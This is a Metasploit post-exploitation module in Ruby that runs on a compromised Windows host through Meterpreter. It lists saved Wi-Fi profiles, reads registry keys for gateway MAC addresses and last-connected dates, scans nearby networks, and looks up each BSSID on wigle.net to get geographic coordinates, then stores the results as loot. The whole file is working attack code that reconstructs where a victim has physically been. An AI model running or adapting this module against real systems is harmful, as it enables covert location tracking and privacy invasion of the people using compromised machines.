##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post
	include Msf::Auxiliary::Report

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Gather Wireless BSS Info',
			'Description'   => %q{
				This module gathers information about the wireless Basic Service Sets
				available to the victim machine.
				},
			'License'       => MSF_LICENSE,                        
                        'Author'        =>
			[
                         'TheLightCosine <thelightcosine[at]gmail.com>',  # Code For Original wlan_bss_list 
			 'v10l3nt' # Added ability to query wigle.net database
			],

			'Version'       => '$Revision$',
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))
                register_options([
                        OptString.new('USER', [true, 'Wigle.net user account.']),
                        OptString.new('PASS', [true, 'Wigle.net account password.']),                                 
                ], self.class)

	end

	def run
                # Load Required Libraries: rubygems / mechanize
                # Gracefully exit if mechanize is not installed
                if loadLibs=='exit'
                  return
                end

                # Logon to Wigle.Net
                print_status("Logging onto Wigle.Net with account: #{datastore['user']}")             
                agent=wigleLogon(datastore['user'],datastore['pass'])

               # Gracefully exit if cannot logon to wigle.net
                if agent=='exit'
                  return
                else
                  print_status("Succesfully Logged onto Wigle.Net.\n")
                end

		#Opens memory access into the host process
		mypid = client.sys.process.getpid
		@host_process = client.sys.process.open(mypid, PROCESS_ALL_ACCESS)
		@wlanapi = client.railgun.wlanapi

		wlan_connections= "Wireless LAN Active Connections: \n"

		wlan_handle = open_handle()
		unless wlan_handle
			print_error("Couldn't open WlanAPI Handle. WLAN API may not be installed on target")
			print_error("On Windows XP this could also mean the Wireless Zero Configuration Service is turned off")
			return
		end

		wlan_iflist = enum_interfaces(wlan_handle)

		networks = []

                print_status("Enumerating all previously connected networks.\n")

               	wlan_list = "Wireless LAN Profile Information \n"
               	wlan_iflist.each do |interface|
			wlan_profiles = enum_profiles(wlan_handle, interface['guid'])
			guid = guid_to_string(interface['guid'])

			wlan_profiles.each do |profile|
                                profile['ssid'] = profile['name'].gsub("\000","")
                                profile['bssid'] = ssid_to_bssid(profile['ssid'])
                                profile['date']= last_Connect(profile['ssid'])
                                profile['geoCoords'] = wigleQuery(agent,profile['bssid'])
              
                                wlanout = "SSID: #{profile['ssid']} \n\tBSSID: #{profile['bssid']} \n"
                                wlanout << "\tLast Connected: #{profile['date']}\n"
                                wlanout << "\tGeo Coords: #{profile['geoCoords']}\n"
                                
                                print_good(wlanout)
                                wlan_list << wlanout
			end
                end
                #strip out any nullbytes for safe loot storage
               	wlan_list.gsub!(/\x00/,"")
		store_loot("host.windows.wlan.profiles", "text/plain", session, wlan_list, "wlan_profiles.txt", "Wireless LAN Profile Information")


                print_status("Scanning all nearby wireless networks.\n")
		wlan_iflist.each do |interface|
			#Scan with the interface, then wait 10 seconds to give it time to finish
			#If we don't wait we can get unpredicatble results. May be a race condition
			scan_results = @wlanapi.WlanScan(wlan_handle,interface['guid'],nil,nil,nil)
			sleep(10)

			#Grab the list of available Basic Service Sets
			bss_list = wlan_get_networks(agent,wlan_handle,interface['guid'])
			networks << bss_list
		end

		#flatten and uniq the array to try and keep a unique lsit of networks
		networks.flatten!
		networks.uniq!
		network_list= "Available Wireless Networks\n\n"
		networks.each do |network|
                          netout = "SSID: #{network['ssid']} \n\tBSSID: #{network['bssid']} \n\tType: #{network['type']}\n\t"
                          netout << "PHY: #{network['physical']} \n\tRSSI: #{network['rssi']} \n\tSignal: #{network['signal']}\n"
                          netout << "\tGeo Coords: #{network['geocoords']}\n"
                          print_good(netout)
                          network_list << netout
		end

		#strip out any nullbytes for safe loot storage
		network_list.gsub!(/\x00/,"")
		store_loot("host.windows.wlan.networks", "text/plain", session, network_list, "wlan_networks.txt", "Available Wireless LAN Networks")

		#close the Wlan API Handle
		closehandle = @wlanapi.WlanCloseHandle(wlan_handle,nil)
		if closehandle['return'] == 0
			print_status("WlanAPI Handle Closed Successfully")
		else
			print_error("There was an error closing the Handle")
		end
	end


	def open_handle
		begin
			wlhandle = @wlanapi.WlanOpenHandle(2,nil,4,4)
		rescue
			return nil
		end
		return wlhandle['phClientHandle']
	end


	def wlan_get_networks(agent,wlan_handle,guid)

		networks = []

		bss_list = @wlanapi.WlanGetNetworkBssList(wlan_handle,guid,nil,3,true,nil,4)
		#print_status(bss_list.inspect)

		pointer = bss_list['ppWlanBssList']
		totalsize = @host_process.memory.read(pointer,4)
		totalsize = totalsize.unpack("V")[0]

		pointer = (pointer + 4)
		numitems = @host_process.memory.read(pointer,4)
		numitems = numitems.unpack("V")[0]

		#print_status("Number of Networks: #{numitems}")
         
		#Iterate through each BSS
		(1..numitems).each do |i|
			bss={}

			#If the length of the SSID is 0 then something is wrong. Skip this one
			pointer = (pointer + 4)
			len_ssid = @host_process.memory.read(pointer,4)
			unless len_ssid.unpack("V")[0]
				next
			end

			#Grabs the ESSID
			pointer = (pointer + 4)
			ssid = @host_process.memory.read(pointer,32)
			bss['ssid'] = ssid.gsub(/\x00/,"")

			#Grab the BSSID/MAC Address of the AP
			pointer = (pointer + 36)
			bssid = @host_process.memory.read(pointer,6)
			bssid = bssid.unpack("H*")[0]
			bssid.insert(2,":")
			bssid.insert(5,":")
			bssid.insert(8,":")
			bssid.insert(11,":")
			bssid.insert(14,":")
			bss['bssid'] = bssid

                        #Query wigle.net for the BSSID/MAC to get the geo coords
                        bss['geocoords'] = wigleQuery(agent,bss['bssid'])

			#Get the BSS Type
			pointer = (pointer + 8)
			bsstype = @host_process.memory.read(pointer,4)
			bsstype = bsstype.unpack("V")[0]
			case bsstype
				when 1
					bss['type'] = "Infrastructure"
				when 2
					bss['type'] = "Independent"
				when 3
					bss['type'] = "Any"
				else
					bss['type'] = "Unknown BSS Type"
			end

			#Get the Physical Association Type
			pointer = (pointer + 4)
			phy_type = @host_process.memory.read(pointer,4)
			phy_type = phy_type.unpack("V")[0]
			case phy_type
				when 1
					bss['physical'] = "Frequency-hopping spread-spectrum (FHSS)"
				when 2
					bss['physical'] = "Direct sequence spread spectrum (DSSS)"
				when 3
					bss['physical'] = "Infrared (IR) baseband"
				when 4
					bss['physical'] = "Orthogonal frequency division multiplexing (OFDM)"
				when 5
					bss['physical'] = "High-rate DSSS (HRDSSS)"
				when 6
					bss['physical'] = "Extended rate PHY type"
				when 7
					bss['physical'] = "802.11n PHY type"
				else
					bss['physical'] = "Unknown Association Type"
			end

			#Get the Recieved Signal Strength Indicator
			pointer = (pointer + 4)
			rssi = @host_process.memory.read(pointer,4)
			rssi = getle_signed_int(rssi)
			bss['rssi'] = rssi

			#Get the signal strength
			pointer = (pointer + 4)
			signal = @host_process.memory.read(pointer,4)
			bss['signal'] = signal.unpack("V")[0]

			#skip all the rest of the data points as they aren't particularly useful
			pointer = (pointer + 296)

			networks << bss
		end
		return networks
	end

	def enum_interfaces(wlan_handle)

		iflist = @wlanapi.WlanEnumInterfaces(wlan_handle,nil,4)
		pointer= iflist['ppInterfaceList']

		numifs = @host_process.memory.read(pointer,4)
		numifs = numifs.unpack("V")[0]

		interfaces = []

		#Set the pointer ahead to the first element in the array
		pointer = (pointer + 8)
		(1..numifs).each do |i|
			interface = {}
			#Read the GUID (16 bytes)
			interface['guid'] = @host_process.memory.read(pointer,16)
			pointer = (pointer + 16)
			#Read the description(up to 512 bytes)
			interface['description'] = @host_process.memory.read(pointer,512)
			pointer = (pointer + 512)
			#Read the state of the interface (4 bytes)
			state = @host_process.memory.read(pointer,4)
			pointer = (pointer + 4)
			#Turn the state into human readable form
			state = state.unpack("V")[0]
			case state
				when 0
					interface['state'] = "The interface is not ready to operate."
				when 1
					interface['state'] = "The interface is connected to a network."
				when 2
					interface['state'] = "The interface is the first node in an ad hoc network. No peer has connected."
				when 3
					interface['state'] = "The interface is disconnecting from the current network."
				when 4
					interface['state'] = "The interface is not connected to any network."
				when 5
					interface['state'] = "The interface is attempting to associate with a network."
				when 6
					interface['state'] = "Auto configuration is discovering the settings for the network."
				when 7
					interface['state'] = "The interface is in the process of authenticating."
				else
					interface['state'] = "Unknown State"
			end
			interfaces << interface
		end
		return interfaces
	end



        	def enum_profiles(wlan_handle,guid)
		profiles=[]
		proflist = @wlanapi.WlanGetProfileList(wlan_handle,guid,nil,4)
		ppointer = proflist['ppProfileList']
		numprofs = @host_process.memory.read(ppointer,4)
		numprofs = numprofs.unpack("V")[0]
		ppointer = (ppointer + 8)
		(1..numprofs).each do |j|
			profile={}
			#Read the profile name (up to 512 bytes)
			profile['name'] = @host_process.memory.read(ppointer,512)
			ppointer = (ppointer + 516)

			rprofile = @wlanapi.WlanGetProfile(wlan_handle,guid,profile['name'],nil,4,4,4)
			xpointer= rprofile['pstrProfileXML']

			#The size  of the XML string is unknown. If we read too far ahead we will cause it to break
			#So we start at 1000bytes and see if the end of the xml is present, if not we read ahead another 100 bytes
			readsz = 1000
			profmem = @host_process.memory.read(xpointer,readsz)
			until profmem[/(\x00){2}/]
				readsz = (readsz + 100)
				profmem = @host_process.memory.read(xpointer,readsz)
			end

			#Slice off any bytes we picked up after the string terminates
			profmem.slice!(profmem.index(/(\x00){2}/), (profmem.length - profmem.index(/(\x00){2}/)))
			profile['xml'] = profmem
			profiles << profile
		end
		return profiles
	end

	def getle_signed_int(str)
		arr, bits, num = str.unpack('V*'), 0, 0
		arr.each do |int|
			num += int << bits
			bits += 32
		end
		num >= 2**(bits-1) ? num - 2**bits : num
	end

	#Convert the GUID to human readable form
	def guid_to_string(guid)
		aguid = guid.unpack("H*")[0]
		sguid = "{" + aguid[6,2] + aguid[4,2] + aguid[2,2] + aguid[0,2]
		sguid << "-" + aguid[10,2] +  aguid[8,2] + "-" + aguid[14,2] + aguid[12,2] + "-" +  aguid[16,4]
		sguid << "-" + aguid[20,12] + "}"
		return sguid
	end

        # Extract and return key DefaultGatewayMac on matching description key
        def ssid_to_bssid(ssid)
              key = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Signatures\\Unmanaged'
              root_key, base_key = client.sys.registry.splitkey(key)
              open_key = client.sys.registry.open_key(root_key,base_key,KEY_READ)
              keys = open_key.enum_key
              vals = open_key.enum_value
              if (keys.length > 0)
                keys.each { |subkey|
                  format = 'z50z20z1020c'
                  keyint = key+"\\#{subkey}"
                  root_key, base_key = client.sys.registry.splitkey(keyint)
                  open_keyint =
                  client.sys.registry.open_key(root_key,base_key,KEY_READ)
                  valsint = open_keyint.enum_value
                  v = open_keyint.query_value('Description')
                  desc_key = v.data.to_s
                  
                if (desc_key.eql? ssid)
                     mac_v = open_keyint.query_value('DefaultGatewayMac')
                     bssid = mac_v.data.to_s.unpack("H*")[0]
                     bssid.insert(2,":")
		     bssid.insert(5,":")
		     bssid.insert(8,":")
		     bssid.insert(11,":")
		     bssid.insert(14,":")
                     return bssid
                  end
                }
               else
                return 'error'       
               end
        end

        # Convert Reg Binary To A Date
        def reg_binary_to_date(str)
          begin
            cut=str.scan(/..../)
            year=(cut[0][2,4]+cut[0][0,2]).hex.to_i
            month=(cut[1][2,4]+cut[1][0,2]).hex.to_i

            case month.to_s
            when '1' then month="January"
            when '2' then month="February"
            when '3' then month="March"
            when '4' then month="April"
            when '5' then month="May"
            when '6' then month="June"
            when '7' then month="July"
            when '8' then month="August"
            when '9' then month="September"
            when '10' then month="October"
            when '11' then month="November"
            when '12' then month="December"
            end

            weekday=(cut[2][2,4]+cut[2][0,2]).hex.to_i
            case weekday.to_s
            when '1' then weekday='Monday'
            when '2' then weekday='Tuesday'
            when '3' then weekday='Wednesday'
            when '4' then weekday='Thursday'
            when '5' then weekday='Friday'
            when '6' then weekday='Saturday'
            when '7' then weekday='Sunday'
            end

            date=(cut[3][2,4]+cut[3][0,2]).hex.to_i
            hour=(cut[4][2,4]+cut[4][0,2]).hex.to_i
            min=(cut[5][2,4]+cut[5][0,2]).hex.to_i
            if min < 10 then 
              min="0#{min}"
            end
            return "#{weekday}, #{date} #{month} #{year} #{hour}:#{min}"
          rescue
            return 'Error resolving last connected date'
          end
        end

        # Extract the DateLastConnected Key from the Matching Registry ProfileName
        def last_Connect(ssid)
          begin
              key = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Profiles'
              root_key, base_key = client.sys.registry.splitkey(key)
              open_key = client.sys.registry.open_key(root_key,base_key,KEY_READ)
              keys = open_key.enum_key
              vals = open_key.enum_value
              if (keys.length > 0)
                keys.each { |subkey|
                  format = 'z50z20z1020c'
                  keyint = key+"\\#{subkey}"
                  root_key, base_key = client.sys.registry.splitkey(keyint)
                  open_keyint =
                  client.sys.registry.open_key(root_key,base_key,KEY_READ)
                  valsint = open_keyint.enum_value
                  v = open_keyint.query_value('ProfileName')
                  prof_key = v.data.to_s
                  
                if (prof_key.eql? ssid)
                     conn_v = open_keyint.query_value('DateLastConnected')
                     conn_date = conn_v.data.to_s.unpack("H*")[0]
                     return reg_binary_to_date(conn_date)
                  end
                }
               else
                return 'Error resolving last connected date'       
               end
           rescue 
                return 'Error resolving last connected date'
           end
        end

        #Gracefully load required libraries
        def loadLibs()
          begin
            require 'rubygems'
            require 'mechanize'
          rescue LoadError
            print_error("Exiting. Requires rubygems and mechanize.")
            return 'exit'
          end
        end
        
        #Logon to wigle.net using mechanize library
        def wigleLogon(wigleUser,wiglePass)
          begin
            url = "http://www.wigle.net/gps/gps/main/login"
            agent = Mechanize.new
            page = agent.get(url)
            login_form = page.forms.first
            login_form["credential_0"] = ["#{wigleUser}"]
            login_form["credential_1"] = ["#{wiglePass}"]
            login_form["destination"] = ["/"]
            login_results = agent.submit(login_form, login_form.buttons.first)
            if login_results.body.include? "/gps/gps/main/logout/"
              return agent
            else
              raise
            end
          rescue
            print_error("Exiting. Could not logon to Wigle.")
            return 'exit'
          end
        end

        #Query a BSSID/MAC against wigle.net library
        def wigleQuery(agent,netid)
          begin
            #return 'holding'
            url = "http://wigle.net/gps/gps/main/confirmquery/"
            page = agent.post(url,{"netid"=>"#{netid}"})
            results=page.body
            if results.include? 'too many queries'
              return 'Query rate exceeded.'
            end

            #print results
            if results =~ /(maplat=(.)+&maplon)/
              lat=$1
              lat=lat.sub("maplat=","").chomp("&maplon")
            else
              lat="N/A"
            end
            if results =~ /(maplon=(.)+&mapzoom)/
              lon=$1
              lon=lon.sub("maplon=","").chomp("&mapzoom")
            else
	      lon="N/A"
            end
            geoCoords = "#{lat}, #{lon}"
            if geoCoords.include? "N/A"
              geoCoords="BSSID not found in Wigle.Net"
            end
            return geoCoords
          rescue
            return "BSSID not found in Wigle.Net"
          end		
        end

end
